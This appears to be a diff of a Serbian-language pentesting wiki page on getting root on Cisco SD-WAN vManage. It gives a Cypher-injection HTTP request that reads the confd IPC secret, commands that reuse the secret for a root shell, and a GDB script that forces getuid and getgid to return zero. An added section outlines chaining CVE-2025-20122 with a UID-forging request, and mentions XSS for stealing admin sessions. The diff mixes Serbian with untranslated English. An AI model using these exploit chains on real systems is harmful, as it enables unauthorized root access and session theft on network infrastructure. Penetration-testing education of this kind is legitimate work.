@@ -4,17 +4,17 @@
 
 ## Put 1
 
-(Primer sa [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
+(Primer iz [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-Nakon što smo malo istražili neku [dokumentaciju](http://66.218.245.39/doc/html/rn03re18.html) vezanu za `confd` i različite binarne datoteke (pristupačne sa nalogom na Cisco veb sajtu), otkrili smo da za autentifikaciju IPC soketa koristi tajnu smeštenu u `/etc/confd/confd_ipc_secret`:
+Nakon što smo malo istražili kroz neku [dokumentaciju](http://66.218.245.39/doc/html/rn03re18.html) vezanu za `confd` i različite binarne fajlove (pristupno sa nalogom na Cisco veb-sajtu), otkrili smo da za autentifikaciju IPC socketa koristi tajnu koja se nalazi u `/etc/confd/confd_ipc_secret`:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-Zapamtite našu Neo4j instancu? Ona radi pod privilegijama korisnika `vmanage`, što nam omogućava da preuzmemo datoteku koristeći prethodnu ranjivost:
+Sećate li se naše Neo4j instance? Ona radi pod privilegijama korisnika `vmanage`, što nam omogućava da dohvatimo fajl koristeći prethodnu vulnerability:
 ```
-GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
+GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
 Host: vmanage-XXXXXX.viptela.net
 
@@ -24,7 +24,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-Program `confd_cli` ne podržava argumente komandne linije, već poziva `/usr/bin/confd_cli_user` sa argumentima. Dakle, mogli bismo direktno pozvati `/usr/bin/confd_cli_user` sa našim skupom argumenata. Međutim, nije čitljiv sa našim trenutnim privilegijama, pa moramo da ga preuzmemo iz rootfs i kopiramo koristeći scp, pročitamo pomoć i koristimo ga da dobijemo shell:
+Program `confd_cli` ne podržava argumente komandne linije, već poziva `/usr/bin/confd_cli_user` sa argumentima. Dakle, možemo direktno pozvati `/usr/bin/confd_cli_user` sa sopstvenim skupom argumenata. Međutim, on nije čitljiv sa našim trenutnim privilegijama, pa ga moramo preuzeti iz rootfs-a i kopirati pomoću scp, pročitati pomoć i koristiti ga da dobijemo shell:
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -42,14 +42,17 @@ vManage:~# id
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
-## Path 2
+## Put 2
 
-(Primer sa [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
+(Primer iz [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-Blog¹ tima synacktiv opisao je elegantan način da se dobije root shell, ali upozorenje je da zahteva dobijanje kopije `/usr/bin/confd_cli_user` koja je samo čitljiva od strane root-a. Pronašao sam drugi način da se eskaliram na root bez takvih problema.
+Blog¹ tima synacktiv opisao je elegantan način da se dobije root shell, ali upozorenje je da to zahteva dobijanje kopije `/usr/bin/confd_cli_user` koja je čitljiva samo za root. Pronašao sam drugi način da eskaliram privilegije do root bez takve muke.
 
-Kada sam dekompajlirao `/usr/bin/confd_cli` binarni fajl, primetio sam sledeće:
-```
+Kada sam disasemblirao binar `/usr/bin/confd_cli`, primetio sam sledeće:
+
+<details>
+<summary>Objdump prikazuje prikupljanje UID/GID</summary>
+```asm
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
 40165c: 48 89 c3              mov    %rax,%rbx
@@ -77,20 +80,22 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
 … snipped …
 ```
-Kada pokrenem “ps aux”, primetio sam sledeće (_note -g 100 -u 107_)
+</details>
+
+Kada pokrenem “ps aux”, primetio sam sledeće (_napomena -g 100 -u 107_)
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
-Hipotetisao sam da program “confd_cli” prosleđuje korisnički ID i grupni ID koje je prikupio od prijavljenog korisnika aplikaciji “cmdptywrapper”.
+Pretpostavio sam da program “confd_cli” prosleđuje UID i GID koje je prikupio od prijavljenog korisnika aplikaciji “cmdptywrapper”.
 
-Moj prvi pokušaj bio je da pokrenem “cmdptywrapper” direktno i da mu prosledim `-g 0 -u 0`, ali nije uspelo. Čini se da je negde tokom procesa kreiran deskriptor datoteke (-i 1015) i ne mogu da ga lažiram.
+Prvi pokušaj bio je da pokrenem “cmdptywrapper” direktno i prosledim mu `-g 0 -u 0`, ali nije uspelo. Izgleda da je negde usput kreiran file descriptor (-i 1015) i ne mogu ga falsifikovati.
 
-Kao što je pomenuto u blogu synacktiv (poslednji primer), program `confd_cli` ne podržava argumente komandne linije, ali mogu da utičem na njega pomoću debagera i srećom GDB je uključen u sistem.
+Kao što je pomenuto na synacktiv’s blog (poslednji primer), program `confd_cli` ne podržava argumente komandne linije, ali mogu da utičem na njega pomoću debagera i, srećom, GDB je dostupan na sistemu.
 
-Napravio sam GDB skriptu gde sam naterao API `getuid` i `getgid` da vrate 0. Pošto već imam privilegiju “vmanage” kroz deserializaciju RCE, imam dozvolu da direktno pročitam `/etc/confd/confd_ipc_secret`. 
+Napravio sam GDB skript u kojem sam naterao API `getuid` i `getgid` da vraćaju 0. Pošto već imam “vmanage” privilegiju kroz deserialization RCE, imam dozvolu da direktno pročitam `/etc/confd/confd_ipc_secret`.
 
 root.gdb:
 ```
@@ -110,8 +115,11 @@ root
 end
 run
 ```
-Izlaz konzole:
-```
+Konzolni izlaz:
+
+<details>
+<summary>Konzolni izlaz</summary>
+```text
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
 Copyright (C) 2017 Free Software Foundation, Inc.
@@ -144,4 +152,25 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
+</details>
+
+## Put 3 (greška validacije unosa CLI-a iz 2025.)
+
+Cisco je preimenovao vManage u *Catalyst SD-WAN Manager*, ali osnovni CLI i dalje radi na istoj mašini. Advisory iz 2025. (CVE-2025-20122) opisuje nedovoljnu validaciju unosa u CLI-u koja omogućava **bilo kojem autentifikovanom lokalnom korisniku** da dobije root slanjem posebno oblikovanog zahteva ka manager CLI servisu. Kombinujte bilo koji low-priv foothold (npr. Neo4j deserialization iz Path1, ili cron/backup user shell) sa ovim propustom da pređete na root bez kopiranja `confd_cli_user` ili attaching GDB:
+
+1. Use your low-priv shell to locate the CLI IPC endpoint (tipično `cmdptywrapper` listener koji sluša na portu 4565, kao u Path2).
+2. Craft a CLI request that forges UID/GID fields to 0. Greška u validaciji ne primenjuje UID originalnog pozivaoca, pa wrapper pokreće root-backed PTY.
+3. Pipe any command sequence (`vshell; id`) through the forged request to obtain a root shell.
+
+> The exploit surface is local-only; remote code execution is still required to land the initial shell, but once inside the box exploitation is a single IPC message rather than a debugger-based UID patch.
+
+## Ostali nedavni vManage/Catalyst SD-WAN Manager vulns to chain
+
+* **Authenticated UI XSS (CVE-2024-20475)** – Inject JavaScript u specifična polja interfejsa; krađa admin sesije daje browser-driven put do `vshell` → local shell → Path3 do root-a.
+
+## References
+
+- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
+- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)
+
 {{#include ../../banners/hacktricks-training.md}}
